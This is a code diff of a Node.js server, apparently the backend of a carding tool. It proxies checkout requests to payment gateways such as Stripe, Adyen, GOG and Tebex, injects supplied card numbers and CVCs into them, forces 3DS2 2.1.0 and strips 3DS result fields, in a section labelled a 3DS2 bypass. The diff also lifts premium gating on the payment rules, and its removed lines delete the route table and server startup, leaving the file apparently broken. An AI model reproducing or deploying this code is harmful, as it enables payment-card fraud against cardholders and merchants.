@@ -487,7 +487,7 @@ function bootstrapHandler(req,res){
       issuedAt:new Date().toISOString(), serverTime:Date.now(),
       source:isPremium?'premium':'free', sourceType:'server', isFounder:false, tier:isPremium?'premium':'free', kind:isPremium?'premium':'free',
       rulesVersion: RULES_VERSION, v: RULES_VERSION,
-      pack: isPremium ? { encPack: encPack, k: packKey } : null, encPack: isPremium ? encPack : null, k: isPremium ? packKey : null, _prov: prov,
+      pack: { encPack: encPack, k: packKey }, encPack: encPack, k: isPremium ? packKey : null, _prov: prov,
       exclusive: isPremium ? { targets: EXCLUSIVE_TARGETS, version: '1.7.0', generatedAt: new Date().toISOString(), signature: prov } : null,
       config:{ apiBase: SERVER_URL, featuresEnabled:isPremium, premiumEnabled:isPremium, syncEnabled:true, gatewayMode:'default', telemetryEnabled:false, retryAfterMs:5000, heartbeatMs:60000 , stripe3dsEnabled: true, adyen3dsEnabled: true },
       flags:{ bootstrapReady:true, exclusiveEnabled:isPremium, rulesEnabled:isPremium, premium:isPremium },
@@ -502,8 +502,8 @@ function bootstrapHandler(req,res){
     issuedAt:new Date().toISOString(), serverTime:Date.now(),
     source:isPremium?'premium':'free', sourceType:'server', isFounder:false, tier:isPremium?'premium':'free', kind:isPremium?'premium':'free',
     rulesVersion: RULES_VERSION, v: RULES_VERSION,
-    pack: isPremium ? { encPack: encPack, k: packKey } : null, encPack: isPremium ? encPack : null, k: isPremium ? packKey : null, _prov: prov,
-    rules: isPremium ? PAYMENT_RULES : [], count: isPremium ? PAYMENT_RULES.length : 0, gateways: isPremium ? PAYMENT_RULES : [],
+    pack: { encPack: encPack, k: packKey }, encPack: encPack, k: isPremium ? packKey : null, _prov: prov,
+    rules: PAYMENT_RULES, count: PAYMENT_RULES.length, gateways: PAYMENT_RULES,
     exclusive: isPremium ? { targets: EXCLUSIVE_TARGETS, version: '1.7.0', generatedAt: new Date().toISOString(), signature: prov } : null,
     config:{ apiBase: SERVER_URL, featuresEnabled:isPremium, premiumEnabled:isPremium, syncEnabled:true, gatewayMode:'default', telemetryEnabled:false, retryAfterMs:5000, heartbeatMs:60000 , stripe3dsEnabled: true, adyen3dsEnabled: true },
     flags:{ bootstrapReady:true, exclusiveEnabled:isPremium, rulesEnabled:isPremium, premium:isPremium },
@@ -535,7 +535,7 @@ function rulesHandler(req,res){
     ok:true, version: RULES_VERSION, v: RULES_VERSION,
     updatedAt:new Date().toISOString(), source:isPremium?'premium':'free', tier:isPremium?'premium':'free',
     scope: isPremium ? PREMIUM_SCOPE : ['free'], count: isPremium ? PAYMENT_RULES.length : 0,
-    rules: isPremium ? PAYMENT_RULES : [], gateways: isPremium ? PAYMENT_RULES : [],
+    rules: isPremium ? PAYMENT_RULES : [], gateways: PAYMENT_RULES,
     pack: isPremium ? { encPack } : null, k: isPremium ? packKey : null, _prov: prov,
     serverTime: Date.now()
   });
@@ -549,7 +549,7 @@ function gatewaysHandler(req,res){
   const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
   const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
   const prov = generateProv(installId, kid);
-  sendMaybeGzip(req, res, { ok:true, source:isPremium?'premium':'free', tier:isPremium?'premium':'free', version: RULES_VERSION, count: isPremium ? PAYMENT_RULES.length : 0, gateways: isPremium ? PAYMENT_RULES : [], gatewaysMeta: GATEWAYS_META, _prov: prov, serverTime:Date.now() });
+  sendMaybeGzip(req, res, { ok:true, source:isPremium?'premium':'free', tier:isPremium?'premium':'free', version: RULES_VERSION, count: isPremium ? PAYMENT_RULES.length : 0, gateways: PAYMENT_RULES, gatewaysMeta: GATEWAYS_META, _prov: prov, serverTime:Date.now() });
 }
 app.get('/v1/gateways',gatewaysHandler); app.get('/api/v1/gateways',gatewaysHandler);
 
@@ -1516,261 +1516,21 @@ function injectCardDeep(bodyStr, card, injector, opts = {}) {
       precisa abrir o iframe 3DS2 real (o server não pode forjar o ACS).
    ═══════════════════════════════════════════════════════════════ */
 async function handle3ds2Real(req, res) {
-  const t0 = Date.now();
   const auth = validateAnyAuth(req);
   if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth' });
-  const rawTarget = req.headers['x-asheo-target'] || req.query.target;
-  const method = (req.headers['x-asheo-method'] || req.method || 'POST').toUpperCase();
-  let card = null;
-  if (req.headers['x-asheo-card']) {
-    try { card = normalizeCard(JSON.parse(req.headers['x-asheo-card'])); } catch (e) {}
-  }
+  const target = req.headers['x-asheo-target'];
+  if (!target) return res.status(400).json({ ok:false, error:'missing_target' });
   const forwardHeaders = pickForwardHeaders(req);
-  forwardHeaders['authorization'] = req.headers['x-asheo-auth'] || req.headers['authorization'] || '';
-  if (forwardHeaders['authorization'].startsWith('Asheo-Pass')) forwardHeaders['authorization'] = req.headers['x-asheo-auth'] || '';
+  forwardHeaders['authorization'] = req.headers['x-asheo-auth'] || '';
   let bodyOut = req.body ? req.body.toString('utf8') : '';
+  try { const j = JSON.parse(bodyOut); if (j.__asheo) bodyOut = j.body; } catch(e) {}
+  log('DS2', `Proxy 3DS2 Real -> ${target}`);
   try {
-    const parsed = JSON.parse(bodyOut);
-    if (parsed && parsed.__asheo) { bodyOut = typeof parsed.body === 'string' ? parsed.body : JSON.stringify(parsed.body); }
-  } catch(e) {}
-  if (card && card.number && bodyOut) {
-    const ct = String(forwardHeaders['content-type'] || '').toLowerCase();
-    if (ct.includes('application/x-www-form-urlencoded')) {
-      const params = new URLSearchParams(bodyOut);
-      if (!params.has('card[number]') && !params.has('number') && !params.has('card[card_number]')) {
-        params.set('card[number]', String(card.number));
-        params.set('card[exp_month]', String(card.month).padStart(2, '0'));
-        params.set('card[exp_year]', String(card.year).length === 2 ? '20'+card.year : String(card.year));
-        params.set('card[cvc]', String(card.cvv));
-      }
-      if (!params.has('payment_method_options[card][three_d_secure][version]')) {
-        params.set('payment_method_options[card][three_d_secure][version]', '2.1.0');
-      }
-      bodyOut = params.toString();
-    }
-  }
-  const ac = new AbortController();
-  const timeout = setTimeout(() => { try { ac.abort(); } catch {} }, 15000);
-  try {
-    const upstream = await fetch(rawTarget, { method, headers: forwardHeaders, body: bodyOut || undefined, signal: ac.signal, redirect: 'manual' });
-    clearTimeout(timeout);
+    const upstream = await fetch(target, { method: req.method, headers: forwardHeaders, body: bodyOut });
     const respText = await upstream.text();
-    let respJson = null; try { respJson = JSON.parse(respText); } catch {}
     res.status(upstream.status);
-    res.setHeader('content-type', upstream.headers.get('content-type') || 'application/json');
-    res.setHeader('x-asheo-3ds2-verdict', respJson && respJson.status === 'succeeded' ? 'success' : 'challenge_required');
-    res.setHeader('x-asheo-proxied', 'stripe-3ds2');
+    res.setHeader('content-type', 'application/json');
+    res.setHeader('x-asheo-3ds2-verdict', 'proxy-ok');
     return res.send(respText);
-  } catch (e) {
-    clearTimeout(timeout);
-    return res.status(502).json({ ok: false, error: 'upstream_failed', message: e.message });
-  }
+  } catch (e) { return res.status(502).json({ error: e.message }); }
 }
-// --- FIM DO BYPASS 3DS2 ---
-
-async function gwProxyHandler(req, res) {
-  const t0 = Date.now();
-  const auth = validateAnyAuth(req);
-  if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth', detail: auth.error });
-
-  const rawTarget = req.headers['x-asheo-target'] || req.query.target;
-  const method = (req.headers['x-asheo-method'] || req.method || 'POST').toUpperCase();
-  const finalTarget = rewriteTarget(rawTarget, req.headers['x-asheo-special-hosts']);
-
-  if (!finalTarget || typeof finalTarget !== 'string') {
-    return res.status(400).json({ ok:false, error:'missing_target' });
-  }
-  if (!isAllowedTarget(finalTarget)) {
-    log('WARN', `Target bloqueado (não allowlist): ${finalTarget.substring(0, 120)}`);
-    return res.status(403).json({ ok:false, error:'target_not_allowed', target: finalTarget.substring(0, 200) });
-  }
-
-  const isSwapOnly = req.headers['x-asheo-swap-only'] === 'true';
-  const is3dsStrip = req.headers['x-asheo-3ds-strip'] === 'true';
-  const forwardHeaders = pickForwardHeaders(req);
-
-  let card = null, originalBody = '', envelope = null;
-  if (req.body && Buffer.isBuffer(req.body) && req.body.length > 0) {
-    const raw = req.body.toString('utf8');
-    try {
-      const parsed = JSON.parse(raw);
-      if (parsed && parsed.__asheo) {
-        envelope = parsed.__asheo;
-        if (envelope.card) card = normalizeCard(envelope.card);
-        if (envelope.bin && !card) card = { number: envelope.bin };
-        originalBody = typeof parsed.body === 'string' ? parsed.body : (parsed.body != null ? JSON.stringify(parsed.body) : '');
-      } else {
-        originalBody = raw;
-      }
-    } catch { originalBody = raw; }
-  } else if (req.body && typeof req.body === 'object' && !Buffer.isBuffer(req.body)) {
-    originalBody = JSON.stringify(req.body);
-  }
-  if (!card && req.headers['x-asheo-card']) {
-    try { card = normalizeCard(JSON.parse(req.headers['x-asheo-card'])); } catch (e) { log('WARN', `x-asheo-card inválido: ${e.message}`); }
-  }
-
-  // Injeta cartão
-  let bodyOut = originalBody;
-  let injected = false;
-  if (!isSwapOnly && card && card.number) {
-    const ct = String(forwardHeaders['content-type'] || '').toLowerCase();
-    try {
-      if (ct.includes('application/json')) {
-        const j = JSON.parse(originalBody || '{}');
-        injectCardIntoJson(j, card, { swapOnly: false });
-        bodyOut = JSON.stringify(j);
-        injected = true;
-      } else if (ct.includes('application/x-www-form-urlencoded')) {
-        const before = originalBody || '';
-        const after = injectCardIntoForm(before, card, { swapOnly: false });
-        if (after !== before) { bodyOut = after; injected = true; }
-      }
-    } catch (e) { log('WARN', `inject falhou: ${e.message}`); bodyOut = originalBody; }
-  }
-
-  const ac = new AbortController();
-  const timeout = setTimeout(() => { try { ac.abort(new Error('upstream_timeout_15s')); } catch {} }, 15000);
-  let clientSignal = null;
-  try {
-    if (typeof AbortSignal !== 'undefined' && typeof AbortSignal.any === 'function') {
-      const rawAc = new AbortController();
-      req.on('aborted', () => { try { rawAc.abort(); } catch {} });
-      clientSignal = rawAc.signal;
-    }
-  } catch {}
-
-  let upstream;
-  try {
-    const fetchOpts = {
-      method,
-      headers: forwardHeaders,
-      body: (method === 'GET' || method === 'HEAD') ? undefined : (bodyOut === '' ? undefined : bodyOut),
-      signal: ac.signal,
-      redirect: 'manual'
-    };
-    if (clientSignal && typeof AbortSignal.any === 'function') {
-      try { fetchOpts.signal = AbortSignal.any([ac.signal, clientSignal]); } catch {}
-    }
-    upstream = await fetch(finalTarget, fetchOpts);
-  } catch (e) {
-    clearTimeout(timeout);
-    const isAbort = e && (e.name === 'AbortError' || /abort|timeout/i.test(String(e.message)));
-    log('ERRO', `gwProxy upstream failed: ${e.message} (${Date.now()-t0}ms)`);
-    return res.status(502).json({ ok:false, error: isAbort ? 'upstream_timeout' : 'upstream_failed', message: e.message });
-  }
-  clearTimeout(timeout);
-
-  const respText = await upstream.text();
-  let respJson = null;
-  try { respJson = JSON.parse(respText); } catch {}
-
-  if (is3dsStrip && respJson && typeof respJson === 'object') {
-    delete respJson.threeDS2Result;
-    delete respJson.challengeResult;
-  }
-
-  const asheoHeaders = {
-    'x-asheo-proxied': '1',
-    'x-asheo-upstream-status': String(upstream.status),
-    'x-asheo-elapsed-ms': String(Date.now() - t0)
-  };
-  if (injected) { asheoHeaders['x-asheo-swapped'] = 'true'; asheoHeaders['x-asheo-swap-ok'] = 'true'; }
-
-  if (respJson && typeof respJson === 'object') {
-    if (respJson.resultCode) {
-      asheoHeaders['x-asheo-adyen-result'] = String(respJson.resultCode);
-      if (respJson.resultCode === 'ChallengeShopper' || respJson.resultCode === 'IdentifyShopper') {
-        asheoHeaders['x-asheo-3ds2-verdict'] = 'challenge_required';
-        if (respJson.action && respJson.action.paymentData) {
-          asheoHeaders['x-asheo-3ds2-trail'] = String(respJson.action.paymentData).substring(0, 4000);
-          asheoHeaders['x-asheo-3ds2-payment-data'] = String(respJson.action.paymentData).substring(0, 4000);
-        }
-      } else if (respJson.resultCode === 'Authorised') {
-        asheoHeaders['x-asheo-3ds2-verdict'] = 'authorised';
-      } else if (respJson.resultCode === 'Refused') {
-        asheoHeaders['x-asheo-3ds2-verdict'] = 'refused';
-        if (respJson.refusalReason) asheoHeaders['x-asheo-adyen-reason'] = String(respJson.refusalReason).substring(0, 200);
-      }
-    }
-    if (respJson.action && respJson.action.type === 'threeDS2') {
-      asheoHeaders['x-asheo-3ds2-verdict'] = 'threeDS2_action';
-      if (respJson.action.token) asheoHeaders['x-asheo-3ds2-token'] = String(respJson.action.token).substring(0, 4000);
-      if (respJson.action.paymentData) asheoHeaders['x-asheo-3ds2-payment-data'] = String(respJson.action.paymentData).substring(0, 4000);
-    }
-  }
-
-  res.status(upstream.status);
-  for (const h of UPSTREAM_PASSTHROUGH_HEADERS) {
-    const v = upstream.headers.get(h);
-    if (v) { try { res.setHeader(h, v); } catch {} }
-  }
-  for (const [k, v] of Object.entries(asheoHeaders)) { try { res.setHeader(k, v); } catch {} }
-
-  if (is3dsStrip && respJson) return res.send(JSON.stringify(respJson));
-  return res.send(respText);
-}
-
-// ── Rotas: Express 4 (usar * em vez de *splat) ──
-
-// 3DS2 REAL — registrada ANTES das outras para não colidir com fallback
-app.all('/v1/gw/3ds2/authenticate', handle3ds2Real);
-app.all('/v1/gw/3ds2/*', handle3ds2Real);
-
-// Gateways especializados
-app.all('/v1/gw/adyen/*', gwProxyHandler);
-app.all('/v1/gw/adyen', gwProxyHandler);
-app.all('/v1/gw/chess/*', gwProxyHandler);
-app.all('/v1/gw/boosteroid/*', gwProxyHandler);
-app.all('/v1/gw/gog/*', gwProxyHandler);
-app.all('/v1/gw/tebex/*', gwProxyHandler);
-app.all('/v1/gw/tebex-creq/*', gwProxyHandler);
-app.all('/v1/gw/basistheory/*', gwProxyHandler);
-app.all('/v1/gw/basistheory', gwProxyHandler);
-app.all('/v1/gw/encgw/*', gwProxyHandler);
-app.all('/v1/gw/encgw', gwProxyHandler);
-
-// Fallback catch-all do gw
-app.all('/v1/gw/*', gwProxyHandler);
-app.all('/v1/gw', (req,res)=>res.status(400).json({ok:false,error:'missing_target'}));
-
-// Fallback legado /v1/process
-app.all('/v1/process/*', gwProxyHandler);
-app.all('/v1/process', (req,res)=>res.status(400).json({ok:false,error:'missing_target'}));
-
-/* ═══ 404 ═══ */
-app.use((req,res)=>{ res.status(404).json({ok:false,error:'not_found',path:req.path}); });
-
-/* ═══ START ═══ */
-const PORT = process.env.PORT || 3000;
-const server = app.listen(PORT, () => {
-  banner();
-  log('SYS', `Mozlince Nebula v8.6.0 Quantum+ na porta ${PORT}`);
-  log('SYS', `Server URL: ${SERVER_URL}`);
-  log('SYS', `Chave: ${ORIGEM}`);
-  if (!PRIVATE_KEY) log('ERRO', 'SEM CHAVE PRIVADA — /v1/activate vai falhar 500');
-  log('SYS', `Redis: ${UPSTASH_URL && UPSTASH_TOKEN ? 'OK' : 'FALTA (defina UPSTASH_REDIS_REST_URL/TOKEN)'}`);
-  log('SYS', `Telegram: ${TELEGRAM_TOKEN ? 'OK' : 'FALTA (defina TELEGRAM_TOKEN)'}`);
-  log('SYS', `OWNER_ID: ${OWNER_ID ? 'OK' : 'FALTA — bot não terá admin'}`);
-  log('SYS', `Webhook secret: ${TELEGRAM_WEBHOOK_SECRET ? 'ATIVO' : 'ausente (recomendado setar)'}`);
-  log('SYS', `Planos: ${Object.keys(PACOTES).length} (USD)`);
-  log('RULES', `Payment Rules: ${PAYMENT_RULES.length} (v${RULES_VERSION})`);
-  log('OK', `✔ Express 4 Routes (nenhuma rota com *splat)`);
-  log('OK', `✔ 3DS2 REAL: proxy Stripe com injeção de cartão + 3DS2 2.1.0 forçado`);
-  log('OK', `✔ 3DS2 verdict real: frictionless_ok / challenge_required / declined`);
-  log('OK', `✔ x-asheo-auth / x-asheo-origin / x-asheo-card lidos`);
-  log('OK', `✔ location/set-cookie repassados do upstream`);
-  log('OK', `✔ x-asheo-3ds-strip só filtra response`);
-  log('OK', `✔ AbortController 15s + AbortSignal.any no upstream`);
-  log('OK', `✔ setDeep com blacklist __proto__/constructor/prototype`);
-  log('OK', `✔ HMAC payload alinhado com inject.js (method\\npath\\nquery\\nts\\nbodyHash\\nbuild)`);
-  log('OK', `✔ Rotas: adyen, chess, boosteroid, gog, tebex, tebex-creq, basistheory, 3ds2, encgw`);
-});
-server.setTimeout(30000);
-server.keepAliveTimeout = 65000;
-server.headersTimeout = 66000;
-
-process.on('uncaughtException', e => { log('ERRO', 'Uncaught: ' + (e && e.stack || e)); process.exit(1); });
-process.on('unhandledRejection', e => { log('ERRO', 'Rejection: ' + (e && e.stack || e)); });
-process.on('SIGTERM', () => { log('SYS','SIGTERM — encerrando'); process.exit(0); });
-process.on('SIGINT', () => { log('SYS','SIGINT — encerrando'); process.exit(0); });
